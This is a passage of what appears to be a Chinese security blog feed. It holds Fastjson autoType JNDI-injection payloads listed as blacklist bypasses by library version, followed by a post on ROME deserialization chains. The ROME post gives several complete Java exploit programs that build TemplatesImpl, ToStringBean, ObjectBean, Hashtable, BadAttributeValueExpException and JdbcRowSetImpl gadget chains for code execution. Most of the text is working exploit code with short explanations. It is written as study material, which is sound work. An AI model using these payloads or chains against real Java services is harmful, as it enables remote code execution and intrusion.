<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>org.apache.shiro.jndi.JndiObjectFactory类Poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="其他一些绕过黑名单的Gadget"><a href="#其他一些绕过黑名单的Gadget" class="headerlink" title="其他一些绕过黑名单的Gadget"></a>其他一些绕过黑名单的Gadget</h5><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p>
<p><strong>1.2.59</strong></p>
<p>com.zaxxer.hikari.HikariConfig类Poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>1.2.61</strong></p>
<p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类Poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>1.2.62</strong></p>
<p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类Poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="string">&quot;parameters&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>1.2.68</strong></p>
<p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类Poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>com.caucho.config.types.ResourceRef类Poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="string">&quot;lookupName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;value&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.value&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ROME反序列化</title>
    <url>/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="ROME反序列化基本调用流程"><a href="#ROME反序列化基本调用流程" class="headerlink" title="ROME反序列化基本调用流程"></a>ROME反序列化基本调用流程</h3><p>它指的是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。</p>
<p>他有个特殊的位置就是ROME提供了ToStringBean这个类，提供深入的toString方法对Java Bean进行操作。</p>
<p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了  RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds  格式。</p>
<p>导入依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p>这里先看看ysoserial中的利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ObjectBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>
<p>这里有挺多和cc链相似的调用，这里也是通过TemplatesImpl来实现任意类加载，后面也是通过hsahmap的readObject方法来完成调用，下面就可以具体看看中间的调用流程是怎么实现的</p>
<p>首先TemplatesImpl的getOutputProperties方法满足javaBean的写法，在ToStringBean的toString方法中就完美的满足了其调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;pds.length;i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod!=<span class="literal">null</span> &amp;&amp;                             <span class="comment">// ensure it has a getter method</span></span><br><span class="line">                    pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="comment">// filter Object.class getter methods</span></span><br><span class="line">                    pReadMethod.getParameterTypes().length==<span class="number">0</span>) &#123;     <span class="comment">// filter getter methods that take parameters</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);</span><br><span class="line">                    printProperty(sb,prefix+<span class="string">&quot;.&quot;</span>+pName,value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里先静态的分析其toString的代码逻辑，这里先是通过BeanIntrospector的getPropertyDescriptors方法来获取_beanClass类中的所有属性描述符，方便后续来反射调用其getter方法</p>
<p>后面就是通过for循环来执行getter方法的流程，具体就是执行_obj对象的方法，从这里知道_beanClass类应该为我们的Templates.class，而_obj对象为我们恶意构造的templates对象</p>
<p>查看ToStringBean类的相关信息，这里发现它是实现了Serializable接口，并且它的有参构造函数里面可以传入我们构造的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ToStringBean</span><span class="params">(Class beanClass,Object obj)</span> &#123;</span><br><span class="line">    _beanClass = beanClass;</span><br><span class="line">    _obj = obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为ToStringBean的toString(String)方法是private方法，就可以看看哪里调用了toString(String)，这里就在它的另外一个toString方法里面</p>
<p><img src="https://luokuang1.github.io/images/rome1.PNG" width="95%" height="80%"></p>
<p>第一段exp就结束了，成功命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">    bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">    toStringBean.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就得继续看哪里可以调用任意类的toString方法就可以，下面就来到了EqualsBean类的beanHashCode，而beanHashCode又被它的hashCode方法所调用，下面就可以延长exp链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _obj.toString().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">    bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    equalsBean.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面就可以结合cc链来实现完整的poc链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.hashCode();</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(equalsBean,<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(map,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>下面就是其它exp构造</p>
<h3 id="EXP-ObjectBean"><a href="#EXP-ObjectBean" class="headerlink" title="EXP(ObjectBean)"></a>EXP(ObjectBean)</h3><p>ObjectBean类可以代替上面的EqualsBean类因为在其构造方法里面创建了一个EqualsBean对象，还是一样它的hashCode方法里面调用了beanHashCode方法所以就可以直接平替的作用</p>
<p><img src="https://luokuang1.github.io/images/rome2.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rome3.png" width="95%" height="80%"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.hashCode();</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(equalsBean,<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(map,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="EXP-HashTable"><a href="#EXP-HashTable" class="headerlink" title="EXP(HashTable)"></a>EXP(HashTable)</h3><p>这里针对如果入口类黑名单中存在HashMap类，我们这里能够用HashTable进行绕过，我们可以发现HashTable的readObject地方，对每个key和value都会调用reconstitutionPut()函数，该函数里面又调用了key的hashcode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.hashCode();</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(equalsBean,<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(hashtable,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="EXP-BadAttributeValueExpException"><a href="#EXP-BadAttributeValueExpException" class="headerlink" title="EXP(BadAttributeValueExpException)"></a>EXP(BadAttributeValueExpException)</h3><p>结合cc的做法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Class c=badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(badAttributeValueExpException,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>这里采用的是FastJson&lt;=1.2.24版本，所以该版本的限制这里也存在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:9999/test&quot;</span>;</span><br><span class="line">    jdbcRowSet.setDataSourceName(url);</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    Class c=badAttributeValueExpException.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">    Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">    aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    aa.set(toStringBean,jdbcRowSet);</span><br><span class="line">    serialized(badAttributeValueExpException,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">    unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>流程分析，这里后半段里面是通过调用传入类的属性的getter方法，目的是调用到JdbcRowSetImpl的connect方法，这里调用了lookup方法从而实现jndi注入</p>
<p><img src="https://luokuang1.github.io/images/rome4.png" width="95%" height="80%"></p>
<p>它的connect方法是在它的getDatabaseMetaData方法，这个方法为一个getter方法</p>
